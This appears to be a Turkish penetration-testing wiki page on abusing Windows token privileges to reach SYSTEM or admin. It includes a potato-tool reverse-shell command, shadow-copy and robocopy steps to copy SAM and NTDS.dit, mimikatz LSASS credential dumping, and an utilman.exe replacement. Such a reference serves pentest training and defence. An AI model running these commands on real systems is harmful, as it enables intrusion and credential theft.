# Token'ları Kötüye Kullanma

{{#include ../../banners/hacktricks-training.md}}

## Token'lar

**Windows Access Tokens'ın ne olduğunu bilmiyorsanız** devam etmeden önce bu sayfayı okuyun:


{{#ref}}
access-tokens.md
{{#endref}}

**Zaten sahip olduğunuz token'ları kötüye kullanarak yetkilerinizi yükseltebilirsiniz**

### SeImpersonatePrivilege

Bu ayrıcalığa sahip olan herhangi bir process, bir handle elde edilebildiği sürece herhangi bir token'ı taklit edebilir (ancak oluşturamaz). Ayrıcalıklı bir token, bir Windows service'i (DCOM) bir exploit'e karşı NTLM authentication gerçekleştirmeye zorlayarak elde edilebilir; bu da daha sonra SYSTEM ayrıcalıklarıyla bir process çalıştırılmasını sağlar.<sup>[[2]](#references)</sup> Bu vulnerability, [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (winrm'in devre dışı bırakılmış olması gerekir), [SweetPotato](https://github.com/CCob/SweetPotato) ve [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) gibi çeşitli tool'lar kullanılarak exploit edilebilir.

Modern operatör notları:

- **JuicyPotato artık legacy'dir**: Windows 10 1809+/Server 2019+ sürümlerinde, hangi RPC/COM yüzeyine hâlâ erişilebildiğine bağlı olarak **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** veya **PrintSpoofer** tercih edilmelidir.
- **`LOCAL SERVICE`** veya **`NETWORK SERVICE`** olarak çalışan bir service'i compromise ettiyseniz ve `whoami /priv`, `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege` olmadan **filtered token** gösteriyorsa önce hesabın **default privilege set**'ini geri kazanın (örneğin **FullPowers** ile), ardından potato family tool'larını tekrar deneyin.<sup>[[3]](#references)</sup>
- Bazı yeni fork'lar, orijinal tool'lara kıyasla operatörler için daha kullanışlıdır. Örneğin **SigmaPotato**, reflection/in-memory execution ve modern Windows uyumluluğu eklerken **PrintNotifyPotato**, PrintNotify COM service'ini kötüye kullanır ve klasik Spooler path'i devre dışı bırakıldığında genellikle faydalıdır.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

**SeImpersonatePrivilege**'e çok benzerdir; ayrıcalıklı bir token elde etmek için **aynı methodu** kullanır.\
Ardından bu ayrıcalık, yeni/askıya alınmış bir prosese **primary token atamaya** olanak tanır. Ayrıcalıklı impersonation token ile bir primary token türetebilirsiniz (DuplicateTokenEx).\
Bu token ile **CreateProcessAsUser** kullanarak **yeni bir process** oluşturabilir veya bir process'i askıya alınmış olarak oluşturup **token'ı ayarlayabilirsiniz** (genel olarak çalışan bir process'in primary token'ını değiştiremezsiniz).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Bu token'ı etkinleştirdiyseniz, kimlik bilgilerini bilmeden başka herhangi bir kullanıcı için **KERB_S4U_LOGON** kullanarak bir **impersonation token** elde edebilir, token'a **rastgele bir grup** (admins) ekleyebilir, token'ın **integrity level** değerini "**medium**" olarak ayarlayabilir ve bu token'ı **mevcut thread'e** atayabilirsiniz (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Bu ayrıcalık, sistemin herhangi bir dosya için **tüm okuma erişimi** denetimini vermesini sağlar (okuma işlemleriyle sınırlıdır). Yerel Administrator hesaplarının parola hash'lerini registry'den **okumak** için kullanılır; ardından hash ile "**psexec**" veya "**wmiexec**" gibi araçlar kullanılabilir (Pass-the-Hash technique). Ancak bu technique iki durumda başarısız olur: Local Administrator hesabı devre dışı bırakıldığında veya uzaktan bağlanan Local Administrators hesaplarının administrative rights yetkilerini kaldıran bir policy mevcut olduğunda.<sup>[[2]](#references)</sup>\
Pratikte en güvenilir yerleşik workflow genellikle **VSS + `robocopy /b`** yöntemidir: bir shadow copy oluşturup kullanıma açın, ardından ACL'leri bypass eden **backup mode** ile `SAM`/`SYSTEM` veya `NTDS.dit` dosyalarını kopyalayın.<sup>[[4]](#references)</sup>
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Bu **privilege**'ı aşağıdakileri kullanarak **abuse** edebilirsiniz:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec) adresindeki **IppSec**'i takip ederek
- Veya aşağıdaki kaynağın **Backup Operators ile privileges escalation** bölümünde açıklandığı şekilde:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Bu privilege, dosyanın Access Control List (ACL)'inden bağımsız olarak herhangi bir system file üzerinde **write access** sağlar. **modify services**, DLL Hijacking gerçekleştirme ve diğer çeşitli tekniklerin yanı sıra Image File Execution Options üzerinden **debuggers** ayarlama olanağı da dahil olmak üzere privilege escalation için çok sayıda olasılık sunar.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege, özellikle bir user token'ları impersonate etme yeteneğine sahip olduğunda güçlü bir permission'dır; ancak SeImpersonatePrivilege mevcut olmadığında da kullanışlıdır. Bu capability, aynı user'ı temsil eden ve integrity level'ı mevcut process'in integrity level'ını aşmayan bir token'ı impersonate etme yeteneğine dayanır.<sup>[[2]](#references)</sup>

**Key Points:**

- **SeImpersonatePrivilege olmadan impersonation:** Belirli koşullar altında token'ları impersonate ederek EoP için SeCreateTokenPrivilege'tan yararlanmak mümkündür.
- **Token impersonation koşulları:** Başarılı bir impersonation için hedef token'ın aynı user'a ait olması ve integrity level'ının impersonation gerçekleştiren process'in integrity level'ına eşit veya daha düşük olması gerekir.
- **Impersonation token'larının oluşturulması ve değiştirilmesi:** User'lar bir impersonation token'ı oluşturabilir ve buna privileged bir group'un SID'sini (Security Identifier) ekleyerek token'ı güçlendirebilir.

### SeLoadDriverPrivilege

Bu privilege, `ImagePath` ve `Type` için belirli değerler içeren bir registry entry oluşturularak **device drivers**'ı **load and unload** etmeye olanak tanır. `HKLM` (HKEY_LOCAL_MACHINE) üzerinde doğrudan write access kısıtlandığından bunun yerine `HKCU` (HKEY_CURRENT_USER) kullanılmalıdır. Ancak driver configuration için `HKCU`'nun kernel tarafından tanınmasını sağlamak amacıyla belirli bir path izlenmelidir.<sup>[[2]](#references)</sup>

Modern offensive kullanım genellikle **BYOVD**'dir (bring your own vulnerable driver): **signed but vulnerable** bir kernel driver yüklenir ve ardından protections'ı devre dışı bırakmak veya kernel code execution'a geçmek için driver'ın IOCTL'ları kullanılır. Güncel Windows 11/Server build'lerinde **Microsoft vulnerable driver blocklist** ve/veya **HVCI/Memory Integrity** çoğu zaman eski public chain'leri çalışmaz hâle getirdiğinden, klasik `szkg64.sys` tarzı örneklerin artık her ortamda güvenilir olmadığını unutmayın.

Bu path `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` şeklindedir; burada `<RID>`, mevcut user'ın Relative Identifier'ıdır. `HKCU` içinde bu path'in tamamı oluşturulmalı ve iki value ayarlanmalıdır:<sup>[[2]](#references)</sup>

- `ImagePath`, çalıştırılacak binary'nin path'idir
- `Type`, `SERVICE_KERNEL_DRIVER` (`0x00000001`) değerine sahip olmalıdır.

**İzlenecek adımlar:**

1. Kısıtlı write access nedeniyle `HKLM` yerine `HKCU`'ya erişin.
2. `<RID>` mevcut user'ın Relative Identifier'ını temsil edecek şekilde `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` path'ini `HKCU` içinde oluşturun.
3. `ImagePath` değerini binary'nin execution path'ine ayarlayın.
4. `Type` değerini `SERVICE_KERNEL_DRIVER` (`0x00000001`) olarak atayın.
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Bu ayrıcalığı kötüye kullanmanın daha fazla yolu: [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Bu, **SeRestorePrivilege** ile benzerdir. Temel işlevi, WRITE_OWNER erişim hakları sağlanarak açıkça belirtilmiş discretionary access gereksinimini atlatıp bir process'in **bir object'in sahipliğini üstlenmesine** olanak tanır. Süreç, öncelikle yazma amacıyla hedef registry key'in sahipliğini güvence altına almayı, ardından write işlemlerini etkinleştirmek için DACL'yi değiştirmeyi içerir.<sup>[[2]](#references)</sup>
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Bu ayrıcalık, bellekten okuma ve belleğe yazma da dahil olmak üzere diğer işlemleri **debug etmeye** izin verir. Çoğu antivirus ve host intrusion prevention çözümünden kaçabilen çeşitli memory injection stratejileri bu ayrıcalıkla kullanılabilir.<sup>[[2]](#references)</sup>

Modern Windows sistemlerinde `SeDebugPrivilege` ayrıcalığının genellikle **korumasız SYSTEM işlemlerini** açmak ve token'larını kopyalamak için yeterli olduğunu, ancak **LSASS**'a erişebileceğinizi garanti etmediğini unutmayın. **RunAsPPL / LSA Protection** etkinse, `SeDebugPrivilege` mevcut olsa bile korumasız işlemler LSASS'ı okuyamaz veya LSASS'a injection yapamaz. Bu durumda başka bir PPL olmayan SYSTEM işleminden token çalın veya `procdump`'ın çalışacağını varsaymak yerine bir PPL bypass/BYOVD ile chain oluşturun. `SeDebugPrivilege` + `SeImpersonatePrivilege` kullanarak token kopyalamaya ilişkin tam bir örnek için [bu sayfaya](sedebug-+-seimpersonate-copy-token.md) bakın.

#### Dump memory

[SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) içindeki [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) aracını kullanarak **bir işlemin belleğini capture edebilirsiniz**. Özellikle bu yöntem, bir kullanıcı sisteme başarıyla login olduktan sonra kullanıcı credential'larını depolamaktan sorumlu olan **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)** işlemi için kullanılabilir.

Daha sonra bu dump'ı mimikatz içine yükleyerek password'leri elde edebilirsiniz:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Bir `NT SYSTEM` shell elde etmek istiyorsanız şunları kullanabilirsiniz:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Bu hak (Perform volume maintenance tasks), NTFS ACL'lerini atlayarak doğrudan disk G/Ç işlemleri gerçekleştirmek üzere ham volume device handle'larının (ör. \\.\C:) açılmasına izin verir. Bununla, temel blokları okuyarak volume üzerindeki herhangi bir dosyanın byte'larını kopyalayabilir ve hassas materyallerin (ör. %ProgramData%\Microsoft\Crypto\ içindeki machine private key'ler, registry hive'ları, VSS aracılığıyla SAM/NTDS) keyfi olarak okunmasını sağlayabilirsiniz.<sup>[[5]](#references)</sup> Bu durum, CA server'larında özellikle etkilidir; CA private key'in exfiltration'ı, herhangi bir principal'ı taklit etmek üzere Golden Certificate forgery yapılmasını sağlar.<sup>[[6]](#references)</sup>

Ayrıntılı teknikler ve mitigations için bkz.:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Privilege'ları kontrol et
```
whoami /priv
```
**Disabled** olarak görünen **token**'lar genellikle etkinleştirilebilir; bu nedenle hem _Enabled_ hem de _Disabled_ ayrıcalıklarını sıklıkla kötüye kullanabilirsiniz.

### Tüm token'ları etkinleştirme

Devre dışı bırakılmış ayrıcalıklara sahipseniz, tüm token'ları etkinleştirmek için [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) script'ini kullanabilirsiniz:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Or bu [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/) içine gömülü **script**.

## Tablo

[https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin) adresinde tam token privileges cheatsheet bulunmaktadır; aşağıdaki özet yalnızca privilege'ı exploit ederek admin oturumu elde etmenin veya hassas dosyaları okumanın doğrudan yollarını listeler.<sup>[[1]](#references)</sup>

| Privilege                  | Etki      | Tool                    | Çalıştırma yolu                                                                                                                                                                                                                                                                                                                                     | Açıklamalar                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"Bir kullanıcının token'ları impersonate etmesine ve potato.exe, rottenpotato.exe ve juicypotato.exe gibi tool'ları kullanarak nt system'e privesc yapmasına olanak tanır"_                                                                                                                                                                                                      | Güncelleme için [Aurélien Chalot](https://twitter.com/Defte_) teşekkürler. Yakında bunu daha tarif benzeri bir biçimde yeniden ifade etmeye çalışacağım.                                                                                                                                                                                         |
| **`SeBackup`**             | **Tehdit**  | _**Built-in commands**_ | Hassas dosyaları `robocopy /b` veya SeBackup-aware özel copy helper'ları ile okuyun.                                                                                                                                                                                                                                                                 | <p>- `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` ve bazen `%WINDIR%\MEMORY.DMP` için oldukça kullanışlıdır.<br><br>- `robocopy` kullanışlıdır, ancak özel SeBackup cmdlet/API'leri kilitli/açık dosyalar için genellikle daha esnektir.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | `NtCreateToken` ile local admin haklarını içeren rastgele bir token oluşturun.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | **Non-PPL** bir SYSTEM token'ını duplicate edin veya non-protected bir process'in memory'sini dump edin.                                                                                                                                                                                                                                                                 | <p>RunAsPPL/LSA Protection etkinse LSASS dumping genellikle engellenir.</p><p>Script şu adreste bulunabilir: [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | SYSTEM spawn etmek için **Potato family** / named-pipe impersonation kullanın (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato` vb.).                                                                                                                                                                                    | <p>IIS APPPOOL, MSSQL, scheduled tasks gibi service account'larından veya zaten `SeImpersonatePrivilege` sahibi olan herhangi bir context'ten en pratiktir.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. İmzalı ancak vulnerable bir kernel driver (BYOVD) yükleyin<br>2. Kernel R/W elde etmek, security tooling'i devre dışı bırakmak veya SYSTEM'e elevate olmak için driver'ın IOCTL'lerini kullanın<br><br>Alternatif olarak privilege, security-related driver'ları <code>fltMC</code> builtin command ile, örneğin <code>fltMC sysmondrv</code>, unload etmek için kullanılabilir</p>                     | <p><code>szkg64.sys</code> gibi daha eski public driver'lar, vulnerable-driver blocklist / HVCI nedeniyle modern Windows'ta giderek daha fazla engellenmektedir.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. SeRestore privilege mevcut olacak şekilde PowerShell/ISE başlatın.<br>2. Privilege'ı <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>) ile etkinleştirin.<br>3. utilman.exe dosyasını utilman.old olarak yeniden adlandırın<br>4. cmd.exe dosyasını utilman.exe olarak yeniden adlandırın<br>5. Console'u kilitleyin ve Win+U tuşlarına basın</p> | <p>Attack bazı AV software'ler tarafından detect edilebilir.</p><p>Alternative method, aynı privilege'ı kullanarak "Program Files" içinde bulunan service binary'lerini replace etmeye dayanır</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. cmd.exe dosyasını utilman.exe olarak yeniden adlandırın<br>4. Console'u kilitleyin ve Win+U tuşlarına basın</p>                                                                                                                                       | <p>Attack bazı AV software'ler tarafından detect edilebilir.</p><p>Alternative method, aynı privilege'ı kullanarak "Program Files" içinde bulunan service binary'lerini replace etmeye dayanır.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Local admin haklarının dahil edilmesi için token'ları manipulate edin. SeImpersonate gerekebilir.</p><p>Doğrulanması gerekiyor.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - Windows privilege'larından admin'e exploitation paths](https://github.com/gtworek/Priv2Admin)
- [2] [LPE için Token Privileges'ı Abusing](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Privilege'larımı Geri Verin! Lütfen?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (`/b` backup mode, file/folder ACL kontrollerini bypass eder)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Volume maintenance tasks gerçekleştirme (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
